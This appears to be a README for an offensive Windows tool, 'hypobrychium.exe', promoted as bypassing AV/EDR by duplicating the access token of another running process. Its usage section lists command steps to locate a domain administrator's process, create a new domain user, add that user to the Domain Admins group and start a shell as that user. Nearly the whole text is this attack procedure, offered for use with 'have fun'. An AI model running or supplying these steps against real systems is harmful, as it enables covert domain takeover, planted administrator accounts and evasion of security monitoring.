Bypass AV/EDR

Duplicate (unowned) token from a running process without detections

Duplicate the token of a running process and run a command.

Use when there is a process on behalf of a domain administrator or to generate a CMD on any process.

When used with unowned process PIDs, there will be no screen input/output in the CMD, but the shell works fine.

The source will be published soon, I make it watchable ;-) It was written in Delphi (Lazarous)

Special thanks to Ewan who developed some highly professional units.

have fun

Required: 
- Local administrator role
- Powershell or CMD

Usage:
- Verify your session using command command: >query session
- Verify a valid PID using: tasklist /v findstr explorer
- Run exe file against valid pid and add user to domain: .\hypobrychium.exe -runpid:<valid pid you captured> params:"net user <username> <password> /add /domain"
- Elevate user to domain admin: .\hypobrychium.exe -runpid:<valid pid you captured> -params:"net group 'Domain Admins' add/ <username> /domain"
- Start a new shell as new user: runas /user:<username>@<domain name> cmd
- whoami
